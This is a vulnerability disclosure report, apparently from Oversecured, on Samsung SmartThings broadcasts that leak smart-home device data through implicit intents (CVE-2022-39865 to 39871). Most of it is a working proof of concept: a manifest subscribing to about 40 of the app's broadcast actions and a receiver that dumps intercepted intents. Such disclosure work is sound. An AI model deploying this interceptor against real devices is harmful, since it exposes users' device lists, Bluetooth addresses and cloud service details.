# Details

<table>
    <tr>
        <td>Name</td>
        <td>SmartThings</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.oneconnect</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.19</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.10.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39865">CVE-2022-39865</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39866">CVE-2022-39866</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39867">CVE-2022-39867</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39868">CVE-2022-39868</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39869">CVE-2022-39869</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39870">CVE-2022-39870</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39871">CVE-2022-39871</a> (SVE-2022-0968)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$13770</td>
    </tr>
</table>

# Description

Oversecured found multiple uses of implicit intents to send broadcasts that contain sensitive information:
![](Oversecured_report_1.png)
![](Oversecured_report_2.png)
![](Oversecured_report_3.png)

These intents disclosed data about the connected devices to the Samsung smarthome, their statuses, Bluetooth addresses, used cloud services and so on.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.mde.DEVICE_REMOVED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.wearable.launchactivity" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.LAUNCH_D2D_PLUGIN" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.sec.android.screensharing.DLNA_CONNECTION_REQUEST" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.sasdk.response" />
    </intent-filter>
    <intent-filter>
        <action android:name="popup_showing_success" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.android.systemui.update_qs_remote_views" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.android.desktopsystemui.update_qs_remote_views" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.devicelogresult" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.action.DEVELOPER_ID_CHANGED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.watchmanager.ACTION_HM_REQUEST_DISCONNECT" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.qconnect.SSHARE_WIDGET_CHANGED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.action.CONTENTS_SHARING.TRIGGERED_APP_INFORMATION" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.SHOW_PERSISTENT_BANNER" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.CONTINUITY_ONGOING_ACTION_DONE" />
    </intent-filter>
    <intent-filter>
        <action android:name="strongman_success" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.intent.action.RESPONSE_BACKUP_BTLIST" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.internal_action.dev_restart" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.qconnect.easysetup.action.EASYSETUP_REGISTERED_DEVICES" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.UPDATE_AUDIO_PATH_VIEW" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.intent.action.RESPONSE_RESTORE_BTLIST" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.mde.DEVICE_ADDED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.appcessory.DEVICE_BATTERY_LEVEL_REQUEST" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.action.DEVICE_DELETED_BY_REGISTERED_ANOTHER_USER_PUSH_MESSAGE_RECEIVED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.qconnect.easysetup.action.COMPLETE_EASYSETUP_TVOOBE_PLUGIN" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.wms.service.EXTERNALDISCONNECT" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.REMOVE_PERSISTENT_BANNER" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.action.INTERNAL_ACTION_PLUGIN_LAUNCH" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.intent.action.START_SMART_VIEW_MULTI_SELECT" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.android.systemui.action.RESTART" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.action.PUSH_MESSAGE_RECEIVED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.sec.android.screensharing.DLNA_DISCONNECTION_REQUEST" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.action.FAVORITE_SYNC_STATE_CHANGED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.action.DEVICE_DELETED_PUSH_MESSAGE_RECEIVED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.action.ACTION_CLOUD_SERVICE_CHANGED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.ui.account.TwoStepVerificationWebViewActivity.action.TWO_STEP_VERIFICATION_FINSHED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.appcessory.DEVICE_DISCONNECT" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.ui.legalinfo.LegalInfoCheckerActivity.action.PP_RESULT" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.necklet.ACTION_CIRCLE_REQUEST_DISCONNECT" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.mde.ACTION_RESULT" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.action.ALERT_PUSH_MESSAGE_RECEIVED" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.oneconnect.mde.DEVICE_UPDATED" />
    </intent-filter>
</receiver>
```

File `MyReceiver.java`:
```java
public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        DumpUtils.dump(intent, getForeignClassLoader(context, "com.samsung.android.oneconnect"));
    }

    private static ClassLoader getForeignClassLoader(Context context, String str) {
        try {
            return context.createPackageContext(str, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY)
                    .getClassLoader();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
